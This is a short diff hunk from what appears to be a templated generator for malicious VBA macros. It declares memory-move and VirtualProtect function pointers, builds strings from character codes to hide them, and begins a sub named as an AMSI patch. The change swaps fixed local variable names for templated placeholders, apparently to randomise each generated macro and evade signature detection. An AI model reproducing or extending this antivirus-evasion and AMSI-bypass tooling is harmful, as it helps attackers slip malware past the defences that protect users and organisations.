@@ -15,11 +15,11 @@ Private {{ v.fn_movemem }} As LongPtr
 Private {{ v.fn_vprotect }} As LongPtr
 
 Private Function {{ v.fn_build_str }}(codes() As Integer) As String
-    Dim s As String, i As Long
-    For i = 0 To UBound(codes)
-        s = s & Chr(codes(i))
+    Dim {{ v.vba_lv_bs }} As String, {{ v.vba_lv_bi }} As Long
+    For {{ v.vba_lv_bi }} = 0 To UBound(codes)
+        {{ v.vba_lv_bs }} = {{ v.vba_lv_bs }} & Chr(codes({{ v.vba_lv_bi }}))
     Next
-    {{ v.fn_build_str }} = s
+    {{ v.fn_build_str }} = {{ v.vba_lv_bs }}
 End Function
 
 Private Sub {{ v.fn_amsi_patch }}()
